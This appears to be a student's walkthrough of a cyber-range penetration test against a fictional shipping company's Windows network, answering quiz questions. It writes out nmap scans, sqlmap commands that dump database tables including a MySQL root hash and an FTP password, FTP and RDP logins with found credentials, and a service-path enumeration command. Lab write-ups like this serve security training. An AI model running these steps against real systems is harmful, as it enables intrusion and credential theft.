> The Artica Shipping Company cyber range is an offensive range that contains a Windows domain with connected Windows hosts and an intranet website. 
> You will assume the role of a penetration tester conducting a test against Artica's internal network. You have access to its offices and internal network via an Ethernet connection. The IP addresses have been provided for the host on the network, and you've been told which is the domain controller and which host is the intrante web application server. No other information has been provided.

## Question 1: What type of server does Unknown Host 1 appear to be?
- We start scanning the specified host: `nmap -A 10.102.1.217`
- Result: 
   - 21/tcp FTP
   - 80/tcp HTTP
   - 135/tcp MSRPC
   - 445/tcp SMB 
   - 3389/tcp RDP
   - 49154/tcp MSRPC

**Answer Options**
1. FTP Server --> **Correct**, because port 21/TCP is open!
2. Fax Server --> No, because no Fax service is running
3. Sharepoint Server --> Sharepoint needs several open ports which are not open on Host 1
4. Mail Server --> No, because no Mail service is running


![grafik](https://user-images.githubusercontent.com/84674087/132572719-fda53eb8-db2f-4234-903b-c057f4c6ee81.png)

![grafik](https://user-images.githubusercontent.com/84674087/132573149-20808cf0-6599-4d35-8342-3cf0e4930545.png)

## Question 2: What version of Apache is Artica's intranet using?
- We scan all available hosts, because it is not clear which one is providing the internal web service
- `curl --head http://10.102.X.Y`
- Result: On Host 4 **Apache/2.4.29** is running

#### Scans

- Unknown Host 1

![grafik](https://user-images.githubusercontent.com/84674087/132574540-6a740f35-4668-4091-8921-9c599b1cd844.png)

- Unknown Host 2

![grafik](https://user-images.githubusercontent.com/84674087/132574552-9bd95f97-fc7b-46b6-9995-acf4c26cf1f4.png)

- Unknown Host 4

![grafik](https://user-images.githubusercontent.com/84674087/132574562-13d2da92-cacf-477e-bb6a-e9a547071a9e.png)

- Unknown Host 5

![grafik](https://user-images.githubusercontent.com/84674087/132574574-69274b07-bfc0-4d95-b805-6325d0fe7da0.png)

## Question 3: What type of attack is the Artica intranet vulnerable to?

**Answer Options**
1. Cross-Site Scripting
2. SQL Injection
3. Local File Inclusion

#### Approach

- We start scanning Host 4 for vulnerabilities: `nmap -p80 --script=vuln 10.102.11.66`
- Result: It seems there is no obvious DOM based XSS or stored XSS vulnerability exisiting
- Further, after analyzing the website we can confirm there is no input field available, i.e. no file upload mechanism
- The leftover option seems SQL Injection, so we follow this track ...
- A first hint: the single `'` forces an internal error

![grafik](https://user-images.githubusercontent.com/84674087/132576273-8a63dcb4-e42c-4159-8c71-4f4743c8682b.png)

- We start Burpsuite and capture the GET request from the only subdirectory with client interaction, i.e. with parameter transfer

![grafik](https://user-images.githubusercontent.com/84674087/132576664-df8ce7bd-c71c-4958-a4bb-6f0d039252ef.png)

- Now we start sqlmap, leverage the GET request, which we saved as "req.txt", and use "to" as paramter to check through
- `sqlmap -r req.txt -p “to”`
- The host seems vulnerable !

![grafik](https://user-images.githubusercontent.com/84674087/132576958-7295cfb8-f9a9-43ee-bda3-35ade71aa34e.png)

- Then we examine further: `sqlmap -r req.txt -p “to” --tables`
- This reveals four databases:
    - artica (2 tables)
    - information_schema
    - mysql (30 tables)
    - ...
- This confirms that **Artica's intranet is vulnerable to SQL Injections** (!)
 
![grafik](https://user-images.githubusercontent.com/84674087/132577166-ebb1138b-d8a5-4105-89f6-5a8d3094f8fe.png)

![grafik](https://user-images.githubusercontent.com/84674087/132577174-5328591e-90e2-4c29-8b2a-1faf500a0de1.png)

- We dump users from mysql and receive the mysql password hash from root !
- `sqlmap -r req.txt -p “to” -D mysql -T user --dump`: **root@localhost : \*5A33F8157E73ADDBC5AE8B8C49C55F770465A270**

## Question 4: What is the username of the FTP account that can be found in the intranet database?

- `sqlmap -r req.txt -p “to” -D artica -T windows_directory --dump`
- Result: **artica-ftp-acc: 0912jgf93FSnjf**

![grafik](https://user-images.githubusercontent.com/84674087/132580363-cb22f252-5f58-40fb-b7a6-e7930fbfca20.png)


## Question 5: Which of the following directories exists on the FTP server?

**Answer Options**

1. Tools
2. Compliance
3. FTPROOT
4. ADMIN-FILES

#### Approach
- `ftp -v 10.102.5.21 21`
- Result: **Tools**

![grafik](https://user-images.githubusercontent.com/84674087/132578183-a1d3bc76-392e-4aa7-a8fd-b581a6e5b623.png)

## Question 6: Which port is NOT open on Unknown Host 2?

- `nmap -O -sV 10.102.3.116`
- Result: Port 21

![grafik](https://user-images.githubusercontent.com/84674087/132578304-eb4d20b2-4d20-4556-bd7b-f3d8db88335b.png)

## Question 7: What is the name of the domain Unknown Host 2 is connected to?

- Tools like nbtscan, rpcclient or rdesktop do not show success
- Instead, nmap helps out with its scripts
- `nmap --script=rdp* -p3389 -T4 10.102.8.99`
- Result: **artica.office**

![grafik](https://user-images.githubusercontent.com/84674087/132578728-a2e15a24-7782-4ed0-9290-3d572edd0a15.png)

![grafik](https://user-images.githubusercontent.com/84674087/132578759-a7e5dd0b-fb5a-449a-97c4-76ae75e0bca9.png)

![grafik](https://user-images.githubusercontent.com/84674087/132578776-f887a62c-b6dd-4ddd-8f57-ef1f7f43e6a5.png)

## Question 8: What is the NetBIOS computer name of Unknown Host 1?

- We simply use nmap again but upon another host
- `nmap --script=rdp* -p3389 -T4 10.102.5.21`
- Result: **ARTICA-WIN-FTP**

![grafik](https://user-images.githubusercontent.com/84674087/132578932-bdbe6948-d2ec-4e15-a566-1fa8abbd6c1f.png)

## Question 9: What type of attack is the fax server vulnerable to?

#### Answer Options
1. Unquoted service path
2. DLL Hijacking
3. CVE-2019-07-08

#### Approach
- CVE-2019-07-08 is a RDP RCE vulnerability
- Unquoted service path: 
   - Exp: C:\program files\hello.exe
   - Windows API interpret two possible paths:
      -  `C:\program.exe`
      -  `C:\program files\hello.exe`
      -  ...and then executes both of them
      -  This can lead to a security problem if a malicious executable is placed before space (POE possible)
- Let us start with examinig the fax server more deeply
- We logon via FTP and go through each directory
- There is an interesting file under `System Administration` which draws our attention:  fax-server-info.pdf
- We download it: `get fax-server-info.pdf` 
- To read it correctly we have to type `binary` beforehand to NOT download in ASCII mode. Then we take a look

![grafik](https://user-images.githubusercontent.com/84674087/132581622-a29678c9-aca0-40ca-a781-b607bb5bc72d.png)

![grafik](https://user-images.githubusercontent.com/84674087/132581644-f834dc7e-bf39-4326-9488-7c9832b6251c.png)

- We found credentials for the "custom logging windows service" a.k.a remote desktop
- `rdesktop -u artica\fax_acc 10.102.3.34:3389`
- However, rdesktop is not working due to NLA protection (Network Level Authentication)
- We search on the internet how to circumvent this issue and find the alternative tool xfreerdp!
- `xfreerdp /u:"artica\fax_acc"  /v:10.102.3.34:3389`: It works!

![grafik](https://user-images.githubusercontent.com/84674087/132582340-53152dfe-fe21-4e07-b110-68912ab74e39.png)

- After logon to Host 2 we cosnider to look after the unqutoed service path vulnerability. For that we search the internet for more details ... 
- And here we go: [https://pentestlab.blog/2017/03/09/unquoted-service-path/](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
    -  We open CMD on Host 2 and enter: `wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””`
    -  Then we start services.msc and look for the name of service and check the process owner
